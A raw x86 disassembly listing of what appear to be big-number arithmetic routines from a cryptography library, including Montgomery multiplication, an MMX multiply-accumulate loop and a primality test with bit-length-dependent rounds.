  405c3c:	75 f4                	jne    0x405c32
  405c3e:	c2 08 00             	ret    $0x8
  405c41:	8b 54 24 04          	mov    0x4(%esp),%edx
  405c45:	b9 00 00 00 80       	mov    $0x80000000,%ecx
  405c4a:	33 c0                	xor    %eax,%eax
  405c4c:	85 ca                	test   %ecx,%edx
  405c4e:	75 08                	jne    0x405c58
  405c50:	d1 e9                	shr    $1,%ecx
  405c52:	40                   	inc    %eax
  405c53:	83 f8 20             	cmp    $0x20,%eax
  405c56:	72 f4                	jb     0x405c4c
  405c58:	c2 04 00             	ret    $0x4
  405c5b:	8a 4c 24 0c          	mov    0xc(%esp),%cl
  405c5f:	8b 54 24 04          	mov    0x4(%esp),%edx
  405c63:	8d 41 d0             	lea    -0x30(%ecx),%eax
  405c66:	c7 02 ff 00 00 00    	movl   $0xff,(%edx)
  405c6c:	3c 09                	cmp    $0x9,%al
  405c6e:	77 08                	ja     0x405c78
  405c70:	0f be c1             	movsbl %cl,%eax
  405c73:	83 e8 30             	sub    $0x30,%eax
  405c76:	89 02                	mov    %eax,(%edx)
  405c78:	8d 41 bf             	lea    -0x41(%ecx),%eax
  405c7b:	3c 05                	cmp    $0x5,%al
  405c7d:	77 08                	ja     0x405c87
  405c7f:	0f be c1             	movsbl %cl,%eax
  405c82:	83 e8 37             	sub    $0x37,%eax
  405c85:	89 02                	mov    %eax,(%edx)
  405c87:	8d 41 9f             	lea    -0x61(%ecx),%eax
  405c8a:	3c 05                	cmp    $0x5,%al
  405c8c:	77 08                	ja     0x405c96
  405c8e:	0f be c1             	movsbl %cl,%eax
  405c91:	83 e8 57             	sub    $0x57,%eax
  405c94:	89 02                	mov    %eax,(%edx)
  405c96:	8b 02                	mov    (%edx),%eax
  405c98:	3b 44 24 08          	cmp    0x8(%esp),%eax
  405c9c:	1b c0                	sbb    %eax,%eax
  405c9e:	83 e0 06             	and    $0x6,%eax
  405ca1:	83 c0 fa             	add    $0xfffffffa,%eax
  405ca4:	c2 0c 00             	ret    $0xc
  405ca7:	53                   	push   %ebx
  405ca8:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  405cac:	8d 43 fe             	lea    -0x2(%ebx),%eax
  405caf:	83 f8 0e             	cmp    $0xe,%eax
  405cb2:	77 63                	ja     0x405d17
  405cb4:	55                   	push   %ebp
  405cb5:	8b 6c 24 0c          	mov    0xc(%esp),%ebp
  405cb9:	8d 44 24 10          	lea    0x10(%esp),%eax
  405cbd:	57                   	push   %edi
  405cbe:	53                   	push   %ebx
  405cbf:	55                   	push   %ebp
  405cc0:	50                   	push   %eax
  405cc1:	e8 45 f1 ff ff       	call   0x404e0b
  405cc6:	8b f8                	mov    %eax,%edi
  405cc8:	85 ff                	test   %edi,%edi
  405cca:	75 45                	jne    0x405d11
  405ccc:	53                   	push   %ebx
  405ccd:	55                   	push   %ebp
  405cce:	50                   	push   %eax
  405ccf:	55                   	push   %ebp
  405cd0:	e8 85 f0 ff ff       	call   0x404d5a
  405cd5:	8b f8                	mov    %eax,%edi
  405cd7:	85 ff                	test   %edi,%edi
  405cd9:	75 36                	jne    0x405d11
  405cdb:	56                   	push   %esi
  405cdc:	50                   	push   %eax
  405cdd:	55                   	push   %ebp
  405cde:	e8 00 e8 ff ff       	call   0x4044e3
  405ce3:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  405ce7:	85 c0                	test   %eax,%eax
  405ce9:	74 0e                	je     0x405cf9
  405ceb:	56                   	push   %esi
  405cec:	53                   	push   %ebx
  405ced:	55                   	push   %ebp
  405cee:	e8 b4 ff ff ff       	call   0x405ca7
  405cf3:	8b f8                	mov    %eax,%edi
  405cf5:	85 ff                	test   %edi,%edi
  405cf7:	75 17                	jne    0x405d10
  405cf9:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  405cfd:	8b 06                	mov    (%esi),%eax
  405cff:	83 f9 0a             	cmp    $0xa,%ecx
  405d02:	73 05                	jae    0x405d09
  405d04:	80 c1 30             	add    $0x30,%cl
  405d07:	eb 03                	jmp    0x405d0c
  405d09:	80 c1 37             	add    $0x37,%cl
  405d0c:	88 08                	mov    %cl,(%eax)
  405d0e:	ff 06                	incl   (%esi)
  405d10:	5e                   	pop    %esi
  405d11:	8b c7                	mov    %edi,%eax
  405d13:	5f                   	pop    %edi
  405d14:	5d                   	pop    %ebp
  405d15:	eb 03                	jmp    0x405d1a
  405d17:	6a fc                	push   $0xfffffffc
  405d19:	58                   	pop    %eax
  405d1a:	5b                   	pop    %ebx
  405d1b:	c2 0c 00             	ret    $0xc
  405d1e:	53                   	push   %ebx
  405d1f:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  405d23:	57                   	push   %edi
  405d24:	33 ff                	xor    %edi,%edi
  405d26:	85 db                	test   %ebx,%ebx
  405d28:	74 46                	je     0x405d70
  405d2a:	55                   	push   %ebp
  405d2b:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  405d2f:	56                   	push   %esi
  405d30:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  405d34:	2b ee                	sub    %esi,%ebp
  405d36:	8b 0e                	mov    (%esi),%ecx
  405d38:	3b cf                	cmp    %edi,%ecx
  405d3a:	1b d2                	sbb    %edx,%edx
  405d3c:	2b cf                	sub    %edi,%ecx
  405d3e:	89 0e                	mov    %ecx,(%esi)
  405d40:	f7 da                	neg    %edx
  405d42:	8b 04 2e             	mov    (%esi,%ebp,1),%eax
  405d45:	3b c8                	cmp    %eax,%ecx
  405d47:	1b ff                	sbb    %edi,%edi
  405d49:	29 06                	sub    %eax,(%esi)
  405d4b:	f7 df                	neg    %edi
  405d4d:	83 c6 04             	add    $0x4,%esi
  405d50:	03 fa                	add    %edx,%edi
  405d52:	4b                   	dec    %ebx
  405d53:	75 e1                	jne    0x405d36
  405d55:	85 ff                	test   %edi,%edi
  405d57:	74 15                	je     0x405d6e
  405d59:	8b 06                	mov    (%esi),%eax
  405d5b:	3b c7                	cmp    %edi,%eax
  405d5d:	1b c9                	sbb    %ecx,%ecx
  405d5f:	2b c7                	sub    %edi,%eax
  405d61:	f7 d9                	neg    %ecx
  405d63:	89 06                	mov    %eax,(%esi)
  405d65:	8d 76 04             	lea    0x4(%esi),%esi
  405d68:	8b f9                	mov    %ecx,%edi
  405d6a:	85 c9                	test   %ecx,%ecx
  405d6c:	75 eb                	jne    0x405d59
  405d6e:	5e                   	pop    %esi
  405d6f:	5d                   	pop    %ebp
  405d70:	5f                   	pop    %edi
  405d71:	5b                   	pop    %ebx
  405d72:	c2 0c 00             	ret    $0xc
  405d75:	51                   	push   %ecx
  405d76:	53                   	push   %ebx
  405d77:	55                   	push   %ebp
  405d78:	8b 6c 24 10          	mov    0x10(%esp),%ebp
  405d7c:	33 c0                	xor    %eax,%eax
  405d7e:	89 44 24 08          	mov    %eax,0x8(%esp)
  405d82:	56                   	push   %esi
  405d83:	57                   	push   %edi
  405d84:	83 fd 08             	cmp    $0x8,%ebp
  405d87:	0f 82 05 01 00 00    	jb     0x405e92
  405d8d:	8b c5                	mov    %ebp,%eax
  405d8f:	c1 e8 03             	shr    $0x3,%eax
  405d92:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  405d96:	8b 7c 24 20          	mov    0x20(%esp),%edi
  405d9a:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  405d9e:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  405da2:	0f 6e c9             	movd   %ecx,%mm1
  405da5:	0f 6e c3             	movd   %ebx,%mm0
  405da8:	0f 6e 1f             	movd   (%edi),%mm3
  405dab:	0f d4 cb             	paddq  %mm3,%mm1
  405dae:	0f 6e 16             	movd   (%esi),%mm2
  405db1:	0f f4 d0             	pmuludq %mm0,%mm2
  405db4:	0f 6e 66 04          	movd   0x4(%esi),%mm4
  405db8:	0f f4 e0             	pmuludq %mm0,%mm4
  405dbb:	0f 6e 76 08          	movd   0x8(%esi),%mm6
  405dbf:	0f f4 f0             	pmuludq %mm0,%mm6
  405dc2:	0f 6e 7e 0c          	movd   0xc(%esi),%mm7
  405dc6:	0f f4 f8             	pmuludq %mm0,%mm7
  405dc9:	0f d4 ca             	paddq  %mm2,%mm1
  405dcc:	0f 6e 5f 04          	movd   0x4(%edi),%mm3
  405dd0:	0f d4 dc             	paddq  %mm4,%mm3
  405dd3:	0f 6e 6f 08          	movd   0x8(%edi),%mm5
  405dd7:	0f d4 ee             	paddq  %mm6,%mm5
  405dda:	0f 6e 67 0c          	movd   0xc(%edi),%mm4
  405dde:	0f d4 fc             	paddq  %mm4,%mm7
  405de1:	0f 7e 0f             	movd   %mm1,(%edi)
  405de4:	0f 6e 56 10          	movd   0x10(%esi),%mm2
  405de8:	0f f4 d0             	pmuludq %mm0,%mm2
  405deb:	0f 73 d1 20          	psrlq  $0x20,%mm1
  405def:	0f 6e 66 14          	movd   0x14(%esi),%mm4
  405df3:	0f f4 e0             	pmuludq %mm0,%mm4
  405df6:	0f d4 cb             	paddq  %mm3,%mm1
  405df9:	0f 6e 76 18          	movd   0x18(%esi),%mm6
  405dfd:	0f f4 f0             	pmuludq %mm0,%mm6
  405e00:	0f 7e 4f 04          	movd   %mm1,0x4(%edi)
  405e04:	0f 73 d1 20          	psrlq  $0x20,%mm1
  405e08:	0f 6e 5e 1c          	movd   0x1c(%esi),%mm3
  405e0c:	0f f4 d8             	pmuludq %mm0,%mm3
  405e0f:	0f d4 cd             	paddq  %mm5,%mm1
  405e12:	0f 6e 6f 10          	movd   0x10(%edi),%mm5
  405e16:	0f d4 d5             	paddq  %mm5,%mm2
  405e19:	0f 7e 4f 08          	movd   %mm1,0x8(%edi)
  405e1d:	0f 73 d1 20          	psrlq  $0x20,%mm1
  405e21:	0f d4 cf             	paddq  %mm7,%mm1
  405e24:	0f 6e 6f 14          	movd   0x14(%edi),%mm5
  405e28:	0f d4 e5             	paddq  %mm5,%mm4
  405e2b:	0f 7e 4f 0c          	movd   %mm1,0xc(%edi)
  405e2f:	0f 73 d1 20          	psrlq  $0x20,%mm1
  405e33:	0f d4 ca             	paddq  %mm2,%mm1
  405e36:	0f 6e 6f 18          	movd   0x18(%edi),%mm5
  405e3a:	0f d4 f5             	paddq  %mm5,%mm6
  405e3d:	0f 7e 4f 10          	movd   %mm1,0x10(%edi)
  405e41:	0f 73 d1 20          	psrlq  $0x20,%mm1
  405e45:	0f d4 cc             	paddq  %mm4,%mm1
  405e48:	0f 6e 6f 1c          	movd   0x1c(%edi),%mm5
  405e4c:	0f d4 dd             	paddq  %mm5,%mm3
  405e4f:	0f 7e 4f 14          	movd   %mm1,0x14(%edi)
  405e53:	0f 73 d1 20          	psrlq  $0x20,%mm1
  405e57:	0f d4 ce             	paddq  %mm6,%mm1
  405e5a:	0f 7e 4f 18          	movd   %mm1,0x18(%edi)
  405e5e:	0f 73 d1 20          	psrlq  $0x20,%mm1
  405e62:	0f d4 cb             	paddq  %mm3,%mm1
  405e65:	0f 7e 4f 1c          	movd   %mm1,0x1c(%edi)
  405e69:	83 c7 20             	add    $0x20,%edi
  405e6c:	83 c6 20             	add    $0x20,%esi
  405e6f:	0f 73 d1 20          	psrlq  $0x20,%mm1
  405e73:	0f 7e c9             	movd   %mm1,%ecx
  405e76:	0f 77                	emms
  405e78:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  405e7c:	89 7c 24 20          	mov    %edi,0x20(%esp)
  405e80:	89 74 24 1c          	mov    %esi,0x1c(%esp)
  405e84:	83 ed 08             	sub    $0x8,%ebp
  405e87:	48                   	dec    %eax
  405e88:	0f 85 04 ff ff ff    	jne    0x405d92
  405e8e:	8b 44 24 10          	mov    0x10(%esp),%eax
  405e92:	85 ed                	test   %ebp,%ebp
  405e94:	74 35                	je     0x405ecb
  405e96:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  405e9a:	8b 7c 24 20          	mov    0x20(%esp),%edi
  405e9e:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  405ea2:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  405ea6:	ad                   	lods   %ds:(%esi),%eax
  405ea7:	f7 e3                	mul    %ebx
  405ea9:	03 c1                	add    %ecx,%eax
  405eab:	83 d2 00             	adc    $0x0,%edx
  405eae:	03 07                	add    (%edi),%eax
  405eb0:	83 d2 00             	adc    $0x0,%edx
  405eb3:	8b ca                	mov    %edx,%ecx
  405eb5:	ab                   	stos   %eax,%es:(%edi)
  405eb6:	0f 77                	emms
  405eb8:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  405ebc:	89 7c 24 20          	mov    %edi,0x20(%esp)
  405ec0:	89 74 24 1c          	mov    %esi,0x1c(%esp)
  405ec4:	4d                   	dec    %ebp
  405ec5:	75 cf                	jne    0x405e96
  405ec7:	8b 44 24 10          	mov    0x10(%esp),%eax
  405ecb:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  405ecf:	5f                   	pop    %edi
  405ed0:	5e                   	pop    %esi
  405ed1:	5d                   	pop    %ebp
  405ed2:	5b                   	pop    %ebx
  405ed3:	01 01                	add    %eax,(%ecx)
  405ed5:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  405ed9:	8b 01                	mov    (%ecx),%eax
  405edb:	3b 04 24             	cmp    (%esp),%eax
  405ede:	1b c0                	sbb    %eax,%eax
  405ee0:	83 c1 04             	add    $0x4,%ecx
  405ee3:	f7 d8                	neg    %eax
  405ee5:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  405ee9:	89 04 24             	mov    %eax,(%esp)
  405eec:	85 c0                	test   %eax,%eax
  405eee:	75 e3                	jne    0x405ed3
  405ef0:	59                   	pop    %ecx
  405ef1:	c2 10 00             	ret    $0x10
  405ef4:	55                   	push   %ebp
  405ef5:	8b ec                	mov    %esp,%ebp
  405ef7:	51                   	push   %ecx
  405ef8:	51                   	push   %ecx
  405ef9:	56                   	push   %esi
  405efa:	8b 75 10             	mov    0x10(%ebp),%esi
  405efd:	85 f6                	test   %esi,%esi
  405eff:	74 3e                	je     0x405f3f
  405f01:	8b 45 08             	mov    0x8(%ebp),%eax
  405f04:	3b c6                	cmp    %esi,%eax
  405f06:	73 37                	jae    0x405f3f
  405f08:	57                   	push   %edi
  405f09:	6a 00                	push   $0x0
  405f0b:	56                   	push   %esi
  405f0c:	33 ff                	xor    %edi,%edi
  405f0e:	0b 7d 0c             	or     0xc(%ebp),%edi
  405f11:	50                   	push   %eax
  405f12:	57                   	push   %edi
  405f13:	e8 b0 44 00 00       	call   0x40a3c8
  405f18:	8b c8                	mov    %eax,%ecx
  405f1a:	85 d2                	test   %edx,%edx
  405f1c:	75 05                	jne    0x405f23
  405f1e:	83 f9 ff             	cmp    $0xffffffff,%ecx
  405f21:	76 07                	jbe    0x405f2a
  405f23:	83 c9 ff             	or     $0xffffffff,%ecx
  405f26:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  405f2a:	8b 55 14             	mov    0x14(%ebp),%edx
  405f2d:	85 d2                	test   %edx,%edx
  405f2f:	74 09                	je     0x405f3a
  405f31:	8b c1                	mov    %ecx,%eax
  405f33:	0f af c6             	imul   %esi,%eax
  405f36:	2b f8                	sub    %eax,%edi
  405f38:	89 3a                	mov    %edi,(%edx)
  405f3a:	8b c1                	mov    %ecx,%eax
  405f3c:	5f                   	pop    %edi
  405f3d:	eb 0d                	jmp    0x405f4c
  405f3f:	8b 45 14             	mov    0x14(%ebp),%eax
  405f42:	85 c0                	test   %eax,%eax
  405f44:	74 03                	je     0x405f49
  405f46:	83 08 ff             	orl    $0xffffffff,(%eax)
  405f49:	83 c8 ff             	or     $0xffffffff,%eax
  405f4c:	5e                   	pop    %esi
  405f4d:	8b e5                	mov    %ebp,%esp
  405f4f:	5d                   	pop    %ebp
  405f50:	c2 10 00             	ret    $0x10
  405f53:	8b 44 24 08          	mov    0x8(%esp),%eax
  405f57:	56                   	push   %esi
  405f58:	57                   	push   %edi
  405f59:	6a 20                	push   $0x20
  405f5b:	8b 40 08             	mov    0x8(%eax),%eax
  405f5e:	5e                   	pop    %esi
  405f5f:	8b 38                	mov    (%eax),%edi
  405f61:	8d 14 7d 04 00 00 00 	lea    0x4(,%edi,2),%edx
  405f68:	83 e2 08             	and    $0x8,%edx
  405f6b:	03 d7                	add    %edi,%edx
  405f6d:	8b c2                	mov    %edx,%eax
  405f6f:	d1 ee                	shr    $1,%esi
  405f71:	0f af c7             	imul   %edi,%eax
  405f74:	6a 02                	push   $0x2
  405f76:	59                   	pop    %ecx
  405f77:	2b c8                	sub    %eax,%ecx
  405f79:	0f af d1             	imul   %ecx,%edx
  405f7c:	83 fe 08             	cmp    $0x8,%esi
  405f7f:	73 ec                	jae    0x405f6d
  405f81:	8b 44 24 0c          	mov    0xc(%esp),%eax
  405f85:	f7 d2                	not    %edx
  405f87:	42                   	inc    %edx
  405f88:	5f                   	pop    %edi
  405f89:	5e                   	pop    %esi
  405f8a:	89 10                	mov    %edx,(%eax)
  405f8c:	c2 08 00             	ret    $0x8
  405f8f:	83 ec 0c             	sub    $0xc,%esp
  405f92:	56                   	push   %esi
  405f93:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  405f97:	57                   	push   %edi
  405f98:	8b 7c 24 28          	mov    0x28(%esp),%edi
  405f9c:	8b 46 04             	mov    0x4(%esi),%eax
  405f9f:	40                   	inc    %eax
  405fa0:	8b 4f 04             	mov    0x4(%edi),%ecx
  405fa3:	3b c8                	cmp    %eax,%ecx
  405fa5:	0f 82 e3 00 00 00    	jb     0x40608e
  405fab:	83 7f 08 00          	cmpl   $0x0,0x8(%edi)
  405faf:	0f 84 d9 00 00 00    	je     0x40608e
  405fb5:	53                   	push   %ebx
  405fb6:	8b c1                	mov    %ecx,%eax
  405fb8:	55                   	push   %ebp
  405fb9:	c1 e0 02             	shl    $0x2,%eax
  405fbc:	50                   	push   %eax
  405fbd:	6a 00                	push   $0x0
  405fbf:	ff 77 08             	push   0x8(%edi)
  405fc2:	e8 80 c6 ff ff       	call   0x402647
  405fc7:	8b 54 24 30          	mov    0x30(%esp),%edx
  405fcb:	83 c4 0c             	add    $0xc,%esp
  405fce:	8b 5e 04             	mov    0x4(%esi),%ebx
  405fd1:	8b 4f 08             	mov    0x8(%edi),%ecx
  405fd4:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  405fd8:	8b 52 04             	mov    0x4(%edx),%edx
  405fdb:	89 54 24 18          	mov    %edx,0x18(%esp)
  405fdf:	3b d3                	cmp    %ebx,%edx
  405fe1:	72 06                	jb     0x405fe9
  405fe3:	8b d3                	mov    %ebx,%edx
  405fe5:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  405fe9:	83 64 24 14 00       	andl   $0x0,0x14(%esp)
  405fee:	8b 6c 24 20          	mov    0x20(%esp),%ebp
  405ff2:	85 db                	test   %ebx,%ebx
  405ff4:	74 5f                	je     0x406055
  405ff6:	8b 45 08             	mov    0x8(%ebp),%eax
  405ff9:	8b 7c 24 14          	mov    0x14(%esp),%edi
  405ffd:	8b 3c b8             	mov    (%eax,%edi,4),%edi
  406000:	8b 44 24 24          	mov    0x24(%esp),%eax
  406004:	57                   	push   %edi
  406005:	51                   	push   %ecx
  406006:	8b 40 08             	mov    0x8(%eax),%eax
  406009:	50                   	push   %eax
  40600a:	52                   	push   %edx
  40600b:	8b 30                	mov    (%eax),%esi
  40600d:	0f af f7             	imul   %edi,%esi
  406010:	03 31                	add    (%ecx),%esi
  406012:	0f af 74 24 3c       	imul   0x3c(%esp),%esi
  406017:	e8 59 fd ff ff       	call   0x405d75
  40601c:	56                   	push   %esi
  40601d:	ff 74 24 14          	push   0x14(%esp)
  406021:	8b 74 24 30          	mov    0x30(%esp),%esi
  406025:	ff 76 08             	push   0x8(%esi)
  406028:	53                   	push   %ebx
  406029:	e8 47 fd ff ff       	call   0x405d75
  40602e:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  406032:	8b 44 24 14          	mov    0x14(%esp),%eax
  406036:	8b 54 24 18          	mov    0x18(%esp),%edx
  40603a:	89 39                	mov    %edi,(%ecx)
  40603c:	83 c1 04             	add    $0x4,%ecx
  40603f:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  406043:	83 64 99 04 00       	andl   $0x0,0x4(%ecx,%ebx,4)
  406048:	40                   	inc    %eax
  406049:	89 44 24 14          	mov    %eax,0x14(%esp)
  40604d:	3b c3                	cmp    %ebx,%eax
  40604f:	72 a5                	jb     0x405ff6
  406051:	8b 7c 24 30          	mov    0x30(%esp),%edi
  406055:	8d 04 9d 04 00 00 00 	lea    0x4(,%ebx,4),%eax
  40605c:	50                   	push   %eax
  40605d:	51                   	push   %ecx
  40605e:	ff 75 08             	push   0x8(%ebp)
  406061:	e8 bf c5 ff ff       	call   0x402625
  406066:	83 c4 0c             	add    $0xc,%esp
  406069:	56                   	push   %esi
  40606a:	55                   	push   %ebp
  40606b:	e8 61 e3 ff ff       	call   0x4043d1
  406070:	85 c0                	test   %eax,%eax
  406072:	78 08                	js     0x40607c
  406074:	ff 75 08             	push   0x8(%ebp)
  406077:	ff 76 08             	push   0x8(%esi)
  40607a:	eb 06                	jmp    0x406082
  40607c:	ff 77 08             	push   0x8(%edi)
  40607f:	ff 75 08             	push   0x8(%ebp)
  406082:	53                   	push   %ebx
  406083:	e8 96 fc ff ff       	call   0x405d1e
  406088:	5d                   	pop    %ebp
  406089:	33 c0                	xor    %eax,%eax
  40608b:	5b                   	pop    %ebx
  40608c:	eb 03                	jmp    0x406091
  40608e:	6a fc                	push   $0xfffffffc
  406090:	58                   	pop    %eax
  406091:	5f                   	pop    %edi
  406092:	5e                   	pop    %esi
  406093:	83 c4 0c             	add    $0xc,%esp
  406096:	c2 14 00             	ret    $0x14
  406099:	55                   	push   %ebp
  40609a:	8b ec                	mov    %esp,%ebp
  40609c:	83 ec 10             	sub    $0x10,%esp
  40609f:	ff 75 14             	push   0x14(%ebp)
  4060a2:	33 c0                	xor    %eax,%eax
  4060a4:	ff 75 10             	push   0x10(%ebp)
  4060a7:	40                   	inc    %eax
  4060a8:	ff 75 0c             	push   0xc(%ebp)
  4060ab:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4060ae:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4060b1:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4060b4:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4060b7:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4060ba:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4060bd:	50                   	push   %eax
  4060be:	ff 75 08             	push   0x8(%ebp)
  4060c1:	e8 c9 fe ff ff       	call   0x405f8f
  4060c6:	8b e5                	mov    %ebp,%esp
  4060c8:	5d                   	pop    %ebp
  4060c9:	c2 10 00             	ret    $0x10
  4060cc:	55                   	push   %ebp
  4060cd:	8b ec                	mov    %esp,%ebp
  4060cf:	57                   	push   %edi
  4060d0:	8b 7d 08             	mov    0x8(%ebp),%edi
  4060d3:	8b 47 08             	mov    0x8(%edi),%eax
  4060d6:	f6 00 01             	testb  $0x1,(%eax)
  4060d9:	75 05                	jne    0x4060e0
  4060db:	6a f2                	push   $0xfffffff2
  4060dd:	58                   	pop    %eax
  4060de:	eb 3e                	jmp    0x40611e
  4060e0:	53                   	push   %ebx
  4060e1:	56                   	push   %esi
  4060e2:	6a 03                	push   $0x3
  4060e4:	33 db                	xor    %ebx,%ebx
  4060e6:	5e                   	pop    %esi
  4060e7:	56                   	push   %esi
  4060e8:	57                   	push   %edi
  4060e9:	e8 f5 e3 ff ff       	call   0x4044e3
  4060ee:	85 c0                	test   %eax,%eax
  4060f0:	7e 27                	jle    0x406119
  4060f2:	56                   	push   %esi
  4060f3:	57                   	push   %edi
  4060f4:	8d 45 08             	lea    0x8(%ebp),%eax
  4060f7:	50                   	push   %eax
  4060f8:	e8 0e ed ff ff       	call   0x404e0b
  4060fd:	85 c0                	test   %eax,%eax
  4060ff:	75 1b                	jne    0x40611c
  406101:	39 45 08             	cmp    %eax,0x8(%ebp)
  406104:	74 0e                	je     0x406114
  406106:	8b 34 9d 64 19 40 00 	mov    0x401964(,%ebx,4),%esi
  40610d:	43                   	inc    %ebx
  40610e:	85 f6                	test   %esi,%esi
  406110:	7f d5                	jg     0x4060e7
  406112:	eb 08                	jmp    0x40611c
  406114:	6a f2                	push   $0xfffffff2
  406116:	58                   	pop    %eax
  406117:	eb 03                	jmp    0x40611c
  406119:	33 c0                	xor    %eax,%eax
  40611b:	40                   	inc    %eax
  40611c:	5e                   	pop    %esi
  40611d:	5b                   	pop    %ebx
  40611e:	5f                   	pop    %edi
  40611f:	5d                   	pop    %ebp
  406120:	c2 04 00             	ret    $0x4
  406123:	83 ec 40             	sub    $0x40,%esp
  406126:	8d 44 24 10          	lea    0x10(%esp),%eax
  40612a:	53                   	push   %ebx
  40612b:	55                   	push   %ebp
  40612c:	56                   	push   %esi
  40612d:	57                   	push   %edi
  40612e:	50                   	push   %eax
  40612f:	e8 73 d8 ff ff       	call   0x4039a7
  406134:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  406138:	50                   	push   %eax
  406139:	e8 69 d8 ff ff       	call   0x4039a7
  40613e:	8d 44 24 38          	lea    0x38(%esp),%eax
  406142:	50                   	push   %eax
  406143:	e8 5f d8 ff ff       	call   0x4039a7
  406148:	8d 44 24 14          	lea    0x14(%esp),%eax
  40614c:	50                   	push   %eax
  40614d:	e8 55 d8 ff ff       	call   0x4039a7
  406152:	8d 44 24 44          	lea    0x44(%esp),%eax
  406156:	50                   	push   %eax
  406157:	e8 4b d8 ff ff       	call   0x4039a7
  40615c:	8b 6c 24 54          	mov    0x54(%esp),%ebp
  406160:	8d 44 24 20          	lea    0x20(%esp),%eax
  406164:	6a 01                	push   $0x1
  406166:	55                   	push   %ebp
  406167:	50                   	push   %eax
  406168:	e8 0d e6 ff ff       	call   0x40477a
  40616d:	8b f0                	mov    %eax,%esi
  40616f:	85 f6                	test   %esi,%esi
  406171:	0f 85 6a 02 00 00    	jne    0x4063e1
  406177:	8d 44 24 20          	lea    0x20(%esp),%eax
  40617b:	50                   	push   %eax
  40617c:	e8 6b dc ff ff       	call   0x403dec
  406181:	8b d8                	mov    %eax,%ebx
  406183:	8d 44 24 20          	lea    0x20(%esp),%eax
  406187:	50                   	push   %eax
  406188:	8d 44 24 30          	lea    0x30(%esp),%eax
  40618c:	89 5c 24 58          	mov    %ebx,0x58(%esp)
  406190:	50                   	push   %eax
  406191:	e8 54 d9 ff ff       	call   0x403aea
  406196:	8b f0                	mov    %eax,%esi
  406198:	85 f6                	test   %esi,%esi
  40619a:	0f 85 41 02 00 00    	jne    0x4063e1
  4061a0:	53                   	push   %ebx
  4061a1:	8d 44 24 30          	lea    0x30(%esp),%eax
  4061a5:	50                   	push   %eax
  4061a6:	e8 79 e1 ff ff       	call   0x404324
  4061ab:	8b f0                	mov    %eax,%esi
  4061ad:	85 f6                	test   %esi,%esi
  4061af:	0f 85 2c 02 00 00    	jne    0x4063e1
  4061b5:	55                   	push   %ebp
  4061b6:	e8 6b dc ff ff       	call   0x403e26
  4061bb:	3d 14 05 00 00       	cmp    $0x514,%eax
  4061c0:	72 04                	jb     0x4061c6
  4061c2:	6a 02                	push   $0x2
  4061c4:	eb 2a                	jmp    0x4061f0
  4061c6:	3d 52 03 00 00       	cmp    $0x352,%eax
  4061cb:	72 04                	jb     0x4061d1
  4061cd:	6a 03                	push   $0x3
  4061cf:	eb 1f                	jmp    0x4061f0
  4061d1:	3d 8a 02 00 00       	cmp    $0x28a,%eax
  4061d6:	72 04                	jb     0x4061dc
  4061d8:	6a 04                	push   $0x4
  4061da:	eb 14                	jmp    0x4061f0
  4061dc:	3d 5e 01 00 00       	cmp    $0x15e,%eax
  4061e1:	72 04                	jb     0x4061e7
  4061e3:	6a 08                	push   $0x8
  4061e5:	eb 09                	jmp    0x4061f0
  4061e7:	3d fa 00 00 00       	cmp    $0xfa,%eax
  4061ec:	72 05                	jb     0x4061f3
  4061ee:	6a 0c                	push   $0xc
  4061f0:	5f                   	pop    %edi
  4061f1:	eb 0d                	jmp    0x406200
  4061f3:	3d 96 00 00 00       	cmp    $0x96,%eax
  4061f8:	1b ff                	sbb    %edi,%edi
  4061fa:	83 e7 09             	and    $0x9,%edi
  4061fd:	83 c7 12             	add    $0x12,%edi
  406200:	83 64 24 10 00       	andl   $0x0,0x10(%esp)
  406205:	85 ff                	test   %edi,%edi
  406207:	0f 84 d4 01 00 00    	je     0x4063e1
  40620d:	ff 74 24 5c          	push   0x5c(%esp)
  406211:	8b 45 04             	mov    0x4(%ebp),%eax
  406214:	ff 74 24 5c          	push   0x5c(%esp)
  406218:	c1 e0 02             	shl    $0x2,%eax
  40621b:	50                   	push   %eax
  40621c:	8d 44 24 20          	lea    0x20(%esp),%eax
  406220:	50                   	push   %eax
  406221:	e8 37 f2 ff ff       	call   0x40545d
  406226:	8b f0                	mov    %eax,%esi
  406228:	85 f6                	test   %esi,%esi
  40622a:	0f 85 b1 01 00 00    	jne    0x4063e1
  406230:	8d 44 24 20          	lea    0x20(%esp),%eax
  406234:	50                   	push   %eax
  406235:	8d 44 24 18          	lea    0x18(%esp),%eax
  406239:	50                   	push   %eax
  40623a:	e8 0c e2 ff ff       	call   0x40444b
  40623f:	85 c0                	test   %eax,%eax
  406241:	78 30                	js     0x406273
  406243:	8d 44 24 14          	lea    0x14(%esp),%eax
  406247:	50                   	push   %eax
  406248:	e8 d9 db ff ff       	call   0x403e26
  40624d:	8b f0                	mov    %eax,%esi
  40624f:	8d 44 24 20          	lea    0x20(%esp),%eax
  406253:	50                   	push   %eax
  406254:	e8 cd db ff ff       	call   0x403e26
  406259:	2b f0                	sub    %eax,%esi
  40625b:	8d 46 01             	lea    0x1(%esi),%eax
